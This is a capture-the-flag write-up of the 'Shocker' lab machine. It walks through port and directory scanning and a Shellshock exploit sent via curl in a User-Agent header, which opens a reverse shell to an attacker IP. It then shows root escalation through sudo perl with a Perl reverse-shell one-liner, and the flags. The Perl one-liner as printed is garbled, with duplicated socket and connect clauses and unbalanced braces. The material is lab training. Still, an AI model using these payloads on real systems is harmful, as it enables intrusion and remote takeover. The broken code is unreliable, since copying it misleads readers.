## ------------->> Shocker <<----------------

// We will start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.56 -p-
-------

    Nmap scan report for 10.10.10.56
    Host is up (0.31s latency).
    Not shown: 65533 closed ports
    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
    |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
    |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

// Navigating to http://10.10.10.56/ , present us with a website with only photo

![Image 1]()

// Lets search for interesting directories with [gobuster](https://github.com/OJ/gobuster)(By OJ)

    $ gobuster dir -u http://10.10.10.56 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20 
-------

    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.10.56
    [+] Method:                  GET
    [+] Threads:                 20
    [+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Timeout:                 10s
    ===============================================================
    2021/07/07 19:21:00 Starting gobuster in directory enumeration mode
    ===============================================================
    /server-status        (Status: 403) [Size: 299]

    ===============================================================
    2021/07/07 19:47:19 Finished
    ===============================================================

// gobuster = no results
// continue to other tool : [feroxbuster](https://github.com/epi052/feroxbuster)(By epi052)

    $ ./feroxbuster -u http:10.10.10.56 -x php,html
------

     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.3.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http:10.10.10.56
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.3.1
     💲  Extensions            │ [php, html]
     🔃  Recursion Depth       │ 4
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    200        9l       13w      137c http://10.10.10.56/index.html
    403       11l       32w      299c http://10.10.10.56/server-status
    [####################] - 4m    179994/179994  0s      found:2       errors:0      
    [####################] - 4m     89997/89997   362/s   http:10.10.10.56


// Not found much either

// ets try -f (force adding '/' to the end of directories) and -n (not scan recursevly)

    $ ./feroxbuster -u http:10.10.10.56 -f -n
-------

    .......
    403       11l       32w      294c http://10.10.10.56/cgi-bin/
    403       11l       32w      292c http://10.10.10.56/icons/
    403       11l       32w      300c http://10.10.10.56/server-status/
    .......

// Greate, We found /cgi-bin/ directory

// Lets try to search with common cgi scripts extensions in /cgi-bin/

    $ ./feroxbuster -u http:10.10.10.56/cgi-bin/ -x sh,cgi,pl
---------

    ......
    200        7l       17w        0c http://10.10.10.56/cgi-bin/user.sh
    ......

// Alsome, found .sh file /cgi-bin/user.sh

// Download the file and see the contant

    $ cat user.sh
    
    Content-Type: text/plain

    Just an uptime test script

    15:28:27 up 10 min,  0 users,  load average: 0.00, 0.01, 0.00

// when i type uptime in my terminal it like the same command

    $ uptime 
    
    20:20:21 up  3:51,  2 users,  load average: 2.05, 1.92, 1.67

// Lets check the answer in BurpSuite Reapeter

![Image 2]()

// we needed to download the file becouse the gap between Content-Length and Content-Type

// so the first Content-Type selected is  text/x-sh which stends for - (execute .sh file)

// which mean there is some talking with the server so lets try to inject code to the server

// u can add the request that sent in burpsuite , OR 

// one of the techniques i have found was shellshock one liner paylad:

    $ curl -H "User-Agent: () { :; };/bin/bash -i >&/dev/tcp/10.10.17.8/1444 0>&1" http://10.10.10.56:80/cgi-bin/user.sh

// before that just run a listiner 

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...

// And we have a shell

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.238] from (UNKNOWN) [10.10.10.56] 43410
    bash: no job control in this shell
    shelly@Shocker:/usr/lib/cgi-bin$ 

// And user flag

    cat user.txt
    631d652c................

### ----Privilleges Escalation----

// Lets check what have sudo permissions

    $ sudo -l
    
    Matching Defaults entries for shelly on Shocker:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User shelly may run the following commands on Shocker:
        (root) NOPASSWD: /usr/bin/perl
      
// We can see that shelly able to run perl script with high privilleges(sudo)

// all that last to do is make perl reverse shell

// First open a listiner

    $ rlwrap nc -lvnp 9002

// We can found a perl shell script [here](https://www.revshells.com/)

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Shocker/3.png)

    shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'use Socket;$i="10.10.17.8";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

// We got root shell !!

    $ rlwrap nc -lvnp 9002
    listening on [any] 9002 ...
    connect to [10.10.16.238] from (UNKNOWN) [10.10.10.56] 41516
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
    root

// And root flag !

    cat root.txt
    309790.................
